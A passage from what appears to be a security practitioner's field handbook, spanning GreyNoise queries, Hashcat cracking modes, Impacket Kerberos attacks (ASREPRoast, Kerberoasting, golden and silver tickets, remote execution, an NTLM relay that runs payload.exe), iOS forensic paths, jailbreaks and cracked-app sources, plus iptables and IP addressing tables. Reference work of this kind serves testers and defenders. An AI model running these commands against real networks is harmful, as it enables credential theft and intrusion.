> metadata.tor:true metadata.country:sweden 
#RAW_DATA 
The port number(s) the devices has been observed scanning: 
> raw_data.scan.port: 
> raw_data.scan.port:23 
> raw_data.scan.port:23 metdata.country:sweden 
The protocol of the port the device has been observed scanning: 
> raw_data.scan.protocol: 
> raw_data.scan.protocol:udp 
90 
> raw_data.scan.protocol:udp metadata.country:china 
Any HTTP paths the device has been observed crawling the Internet: 
> raw_data.web.paths: 
> raw_data.web.paths:*admin* 
> raw_data.web.paths:*admin* tags:"Jboss Worm" 
Any HTTP user-agents the device has been observed using while 
crawling the Internet 
> raw_data.web.useragents: 
> raw_data.web.useragents:"Mozilla/4.0 (compatible; MSIE 8.0; 
Windows NT 5.2; Trident/4.0)" 
> raw_data.web.useragents:*baidu* metadata.country:Hong Kong 
Fingerprinting TLS encrypted negotiation between client and server 
interactions (https://ja3er.com/ & 
https://github.com/salesforce/ja3/tree/master/lists):  
> raw_data.ja3.fingerprint: 
> raw_data.ja3.fingerprint:6734f37431670b3ab4292b8 f60f29984  
> raw_data.ja3.fingerprint:6734f37431670b3ab4292b8 f60f29984 
metadata.country:china 
REFERENCE: 
https://viz.greynoise.io/cheat-sheet/queries 
https://viz.greynoise.io/cheat-sheet/examples 
https://github.com/GreyNoise-Intelligence/pygreynoise 
H 
H
H 
91 
HASHCAT 
RED TEAM 
PASSWORD CRACKING 
ALL 
Hashcat is the world's fastest and most advanced password recovery 
utility. 
ATTACK MODES 
DICTIONARY ATTACK 
hashcat -a 0 -m #type hash.txt dict.txt 
DICTIONARY + RULES ATTACK 
hashcat -a 0 -m #type hash.txt dict.txt -r rule.txt 
COMBINATION ATTACK 
hashcat -a 1 -m #type hash.txt dict1.txt dict2.txt 
MASK ATTACK 
hashcat -a 3 -m #type hash.txt ?a?a?a?a?a?a 
HYBRID DICTIONARY + MASK 
hashcat -a 6 -m #type hash.txt dict.txt ?a?a?a?a 
HYBRID MASK + DICTIONARY 
hashcat -a 7 -m #type hash.txt ?a?a?a?a dict.txt 
RULES 
RULEFILE -r 
hashcat -a 0 -m #type hash.txt dict.txt -r rule.txt 
MANIPULATE LEFT -j 
hashcat -a 1 -m #type hash.txt left_dict.txt right_dict.txt -j 
MANIPULATE RIGHT -k 
hashcat -a 1 -m #type hash.txt left_dict.txt right_dict.txt -k 
INCREMENT 
DEFAULT INCREMENT 
hashcat -a 3 -m #type hash.txt ?a?a?a?a?a --increment 
INCREMENT MINIMUM LENGTH 
hashcat -a 3 -m #type hash.txt ?a?a?a?a?a --increment-min=4 
INCREMENT MAX LENGTH 
hashcat -a 3 -m #type hash.txt ?a?a?a?a?a?a --increment-max=5 
MISC 
BENCHMARK TEST (HASH TYPE) 
hashcat -b -m #type 
SHOW EXAMPLE HASH 
hashcat -m #type --example-hashes 
ENABLE OPTIMIZED KERNELS (Warning! Decreasing max password length) 
hashcat -a 0 -m #type -O hash.txt dict.txt 
ENABLE SLOW CANDIDATES (For fast hashes w/ small dict.txt + rules) 
hashcat -a 0 -m #type -S hash.txt dict.txt 
SESSION NAME 
hashcat -a 0 -m #type --session  hash.txt dict.txt 
SESSION RESTORE 
92 
hashcat -a 0 -m #type --restore --session  hash.txt 
dict.txt 
SHOW KEYSPACE 
hashcat -a 0 -m #type --keyspace hash.txt dict.txt -r rule.txt 
OUTPUT RESULTS FILE -o 
hashcat -a 0 -m #type -o results.txt hash.txt dict.txt 
CUSTOM CHARSET -1 -2 -3 -4 
hashcat -a 3 -m #type hash.txt -1 ?l?u -2 ?l?d?s ?1?2?a?d?u?l 
ADJUST PERFORMANCE -w 
hashcat -a 0 -m #type -w  hash.txt dict.txt 
KEYBOARD LAYOUT MAPPING 
hashcat -a 0 -m #type --keyb=german.hckmap hash.txt dict.txt 
HASHCAT BRAIN (Local Server & Client) 
(Terminal #1) hashcat --brain-server (copy password generated) 
(Terminal #2) hashcat -a 0 -m #type -z --brain-password  
hash.txt dict.txt 
BASIC ATTACK METHODOLOGY 
1- DICTIONARY ATTACK 
hashcat -a 0 -m #type hash.txt dict.txt 
2- DICTIONARY + RULES  
hashcat -a 0 -m #type hash.txt dict.txt -r rule.txt 
3- HYBRID ATTACKS 
hashcat -a 6 -m #type hash.txt dict.txt ?a?a?a?a 
4- BRUTEFORCE 
hashcat -a 3 -m #type hash.txt ?a?a?a?a?a?a?a?a 
I 
I
I 
93 
ICS / SCADA TOOLS 
RED/BLUE TEAM 
EXPLOIT/DEFEND 
ICS/SCADA 
AWESOME-INDUSTRIAL-CONTROL-SYSTEM-SECURITY 
A curated list of resources related to Industrial Control System 
(ICS) security. 
https://github.com/hslatman/awesome-industrial-control-system-
security 
I
I 
INTERNET EXCHANGE POINTS 
ALL 
INFORMATIONAL 
N/A 
DATABASE OF GLOBAL INTERNET EXCHANGE POINTS 
https://www.internetexchangemap.com/#/ 
https://ixpdb.euro-ix.net/en/ixpdb/ixps/ 
https://api.ixpdb.net/ 
I
I 
IMPACKET 
RED TEAM 
ESCALATE PRIVS 
WINDOWS 
Impacket is a collection of Python classes for working with network 
protocols. Impacket is focused on providing low-level programmatic 
access to the packets and for some protocols (e.g. SMB1-3 and 
MSRPC) the protocol implementation itself. 
ASREPRoast 
GetNPUsers.py: 
# check ASREPRoast for all domain users (credentials required) 
python GetNPUsers.py 
/: -request -format 
 -outputfile 
# check ASREPRoast for a list of users (no credentials required) 
python GetNPUsers.py / -usersfile  -format 
 -outputfile 
Kerberoasting 
GetUserSPNs.py: 
94 
python GetUserSPNs.py 
/: -outputfile 
Overpass The Hash/Pass The Key (PTK) 
# Request the TGT with hash 
python getTGT.py / -hashes 
[lm_hash]: 
# Request the TGT with aesKey 
python getTGT.py / -aesKey  
# Request the TGT with password 
python getTGT.py /:[password] 
# If not provided, password is requested 
# Set the TGT for impacket use 
export KRB5CCNAME= 
# Execute remote commands with any of the following by using the 
TGT 
python psexec.py /@ -k -
no-pass 
python smbexec.py /@ -k -
no-pass 
python wmiexec.py /@ -k -
no-pass 
Ticket in Linux Usage 
# Set the ticket for impacket use 
export KRB5CCNAME= 
# Execute remote commands with any of the following by using the 
TGT 
python psexec.py /@ -k -
no-pass 
python smbexec.py /@ -k -
no-pass 
python wmiexec.py /@ -k -
no-pass 
Silver Ticket 
# To generate the TGS with NTLM 
python ticketer.py -nthash  -domain-sid  -
domain  -spn    
# To generate the TGS with AES key 
python ticketer.py -aesKey  -domain-sid  -
domain  -spn    
95 
# Set the ticket for impacket use 
export KRB5CCNAME= 
# Execute remote commands with any of the following by using the 
TGT 
python psexec.py /@ -k -
no-pass 
python smbexec.py /@ -k -
no-pass 
python wmiexec.py /@ -k -
no-pass 
Golden Ticket 
# To generate the TGT with NTLM 
python ticketer.py -nthash  -domain-sid 
 -domain    
# To generate the TGT with AES key 
python ticketer.py -aesKey  -domain-sid  -
domain    
# Set the ticket for impacket use 
export KRB5CCNAME= 
# Execute remote commands with any of the following by using the 
TGT 
python psexec.py /@ -k -
no-pass 
python smbexec.py /@ -k -
no-pass 
python wmiexec.py /@ -k -
no-pass 
NTLMRELAY SMB RELAY TO SHELL 
#turn off SMB Server on Responder by editing the 
/etc/responder/Responder.conf file.  
echo '10.0.2.9' > targets.txt 
ntlmrelayx.py -tf targets.txt ./payload.exe 
REFERENCE: 
https://github.com/SecureAuthCorp/impacket 
https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a 
I
I 
iOS 
RED/BLUE TEAM 
INFORMATIONAL 
MOBILE 
96 
iOS ARTIFACTS LOCATIONS 
Contacts  
/var/mobile/Library/AddressBook/AddressBookImages.sqlitedb 
Calls  
/var/mobile/Library/CallHistoryDB/CallHistory.storedata 
SMS  
/var/mobile/Library/SMS/sms.db 
Maps  
/var/mobile/Applications/com.apple.Maps/Library/Maps/GeoHistory.map
sdata 
Safari  
/var/mobile/Library/Safari/History.db 
Photos Database  
/var/mobile/Media/PhotoData/Photos.sqlite  
Apple Notes Parser 
https://github.com/threeplanetssoftware/apple_cloud_notes_parser 
REFERENCE 
https://smarterforensics.com/2019/09/wont-you-back-that-thing-up-a-glimpse-
of-ios-13-artifacts/ 
iOS JAILBREAK 
Checkra1n 
checkra1n is a community project to provide a high-quality semi-
tethered jailbreak to all, based on the ‘checkm8’ bootrom exploit. 
iPhone 5s – iPhone X, iOS 12.3 and up 
REFERENCE: 
https://checkra.in/ 
PhoenixPwn 
Semi-untethered jailbreak for 9.3.5-9.3.6. 
All 32-bit devices supported. 
REFERENCE 
https://phoenixpwn.com/ 
iOS APP TESTING 
IDB - iOS App Security Assessment Tool. 
https://github.com/dmayer/idb 
iRET - iOS Reverse Engineering Toolkit. 
https://github.com/S3Jensen/iRET 
DVIA - Damn Vulnerable iOS App for learning. 
http://damnvulnerableiosapp.com/ 
97 
LibiMobileDevice - A cross-platform protocol library to communicate 
with iOS devices. 
https://github.com/libimobiledevice/libimobiledevice 
Needle - iOS App Pentesting Tool. 
https://github.com/mwrlabs/needle 
AppCritique - iOS App Security Assessment Tool. 
https://appcritique.boozallen.com/ 
REFERENCE: 
https://github.com/tanprathan/MobileApp-Pentest-Cheatsheet 
https://github.com/ashishb/osx-and-ios-security-awesome#ios-security 
iOS CRACKED IPA APPS 
AppCake 
https://www.iphonecake.com 
IPA Rocks 
https://ipa.rocks/ 
Need to reverse engineer an iOS app ?  
Works on iOS11 & 12 
1 Add https://level3tjg.github.io  src to Cydia 
2 Install bfdecrypt 
3 Go to bfdecrypt pref pane in Settings & set the app to decrypt 
4 Launch it 
5 Decrypted IPA is stored in the Documents folder of the app 
I
I 
IPTABLES 
ALL 
CONFIGURATION 
FIREWALL 
iptables is a user-space utility program that allows a system 
administrator to configure the tables provided by the Linux kernel 
firewall. 
CHAINS 
INPUT: used to control incoming connections. 
OUTPUT: used to control outgoing connections. 
FORWARD: used for incoming connections that are not local; i.e. 
routing and NATing. 
ACTIONS 
ACCEPT: Allow the specified connection parameters. 
DROP: Drop the specified connection parameters. 
REJECT: Disallow the connection and send a reject notification to 
source. 
98 
Flush existing rules 
# iptables -F 
Display all active iptables rules: 
# iptables -n -L -v --line-numbers 
Set default chain policies : 
# iptables -P INPUT  
# iptables -P OUTPUT  
# iptables -P FORWARD  
Display rules by chain: 
# iptables -L  
Add single IP Address inbound : 
# iptables -A INPUT -s 10.0.0.10 -j  
Add single IP Address outbound : 
# iptables -A OUTPUT -d 10.0.0.10 -j  
Drop outbound access to a specific site: 
# iptables -A OUTPUT -p tcp -d example.com -j DROP 
Delete a specific INPUT rule: 
# iptables -D INPUT -s 10.0.0.10 -p tcp -dport 80 -j ACCEPT 
Delete a specific OUTPUT rule: 
# iptables -D OUTPUT -d 10.0.0.10 -p tcp -dport 80 -j ACCEPT 
Delete by a specific INPUT/OUTPUT/FORWARD rule number: 
First show rules by number: 
# iptables -n -L -v --line-numbers 
Then delete rule: 
# iptables -D  5 
Insert a rule in a specific position for inbound: 
# iptables -I INPUT 3 -s 10.0.0.10 -j DROP 
Insert a rule in a specific position for outbound: 
# iptables -I OUTPUT 2 -d 10.0.0.10 -j ACCEPT 
Allow inbound current established connections and related: 
# iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j 
ACCEPT 
99 
Allow outbound current established connections: 
# iptables -A OUTPUT -m conntrack --ctstate ESTABLISHED -j ACCEPT 
I
I 
IPv4 
ALL 
INFORMATIONAL 
N/A 
IPv4 PRIVATE RANGES 
Class 
Size 
Mask 
Range 
 A 
10.0.0.0/8 
255.0.0.0 
10.0.0.0 
10.255.255.255 
 B 
172.16.0.0/12 
255.240.0.0 
172.16.0.0 
172.31.255.255 
 C 
192.168.0.0/16 
255.255.0.0 
192.168.0.0 
192.168.255.255 
IPv4 PUBLIC SUBNET CLASSES 
Class Size 
Mask 
Range 
Hosts 
 A 
8.0.0.0/8 
255.0.0.0 
8.0.0.0 
8.255.255.255 16,777,214 
 B 
8.8.0.0/16 
255.255.0.0 
8.8.0.0 
8.8.255.255 
65,534 
 C 
8.8.8.0/24 
255.255.255.0 
8.8.8.0 
8.8.8.255 
254 
IPv4 CLASS C SUBNET TABLE 
Subnet 
Addresses 
Netmask 
# of Class C 
/31 
2 
255.255.255.254 
1/128 
/30 
4 
255.255.255.252 
1/64 
/29 
8 
255.255.255.248 
1/32 
/28 
16 
255.255.255.240 
1/16 
/27 
32 
255.255.255.224 
1/8 
/26 
64 
255.255.255.192 
1/4 
/25 
128 
255.255.255.128 
1/2 
/24 
256 
255.255.255.0 
1 
/23 
512 
255.255.254.0 
2 
/22 
1024 
255.255.252.0 
4 
/21 
2048 
255.255.248.0 
8 
/20 
4096 
255.255.240.0 
16 
/19 
8192 
255.255.224.0 
32 
/18 
16384 
255.255.192.0 
64 
/17 
32768 
255.255.128.0 
128 
/16 
65536 
255.255.0.0 
256 
/15 
131072 
255.254.0.0 
512 
/14 
262144 
255.252.0.0 
1024 
100 
/13 
524288 
255.248.0.0 
2048 
/12 
1048576 
255.240.0.0 
4096 
/11 
2097152 
255.224.0.0 
8192 
/10 
4194304 
255.192.0.0 
16384 
/9 
8388608 
255.128.0.0 
32768 
/8 
16777216 
255.0.0.0 
65536 
I
I 
IPv6 
ALL 
INFORMATIONAL 
N/A 
BROADCAST ADDRESSES 
ff01::2 
Node-Local Routers 
ff02::1 
Link-Local Nodes 
ff02::2 
Link-Local Routers 
ff05::1 
Site-Local Nodes 
ff05::2 
Site-Local Routers 
IPv6 SIZE 
Sub 
# of Addresses 
Amount of a 
/64 
/128 
1 
/127 
2 
/126 
4 
/125 
8 
/124 
16 
/123 
32 
/122 
64 
/121 
128 
/120 
256 
/119 
512 
/118 
1,024 
/117 
2,048 
/116 
4,096 
/115 
8,192 
/114 
16,384 
/113 
32,768 
/112 
65,536 
/111 
131,072 
/110 
262,144 
/109 
524,288 
/108 
1,048,576 
/107 
2,097,152 
/106 
4,194,304 
/105 
8,388,608 
101 
/104 
16,777,216 
Equivalent 
to an IPv4 
Internet or 
IPv4 /8 
/103 
33,554,432 
/102 
67,108,864 
/101 
134,217,728 
/100 
268,435,456 
/99 
536,870,912 
/98 
1,073,741,824 
/97 
2,147,483,648 
/96 
4,294,967,296 
/95 
8,589,934,592 
/94 
17,179,869,184 
/93 
34,359,738,368 
/92 
68,719,476,736 
/91 
137,438,953,472 
/90 
274,877,906,944 
/89 
549,755,813,888 
/88 
1,099,511,627,776 
/87 
2,199,023,255,552 
1/8,388,608 
/86 
4,398,046,511,104 
1/4,194,304 
/85 
8,796,093,022,208 
1/2,097,152 
/84 
17,592,186,044,416 
1/1,048,576 
/83 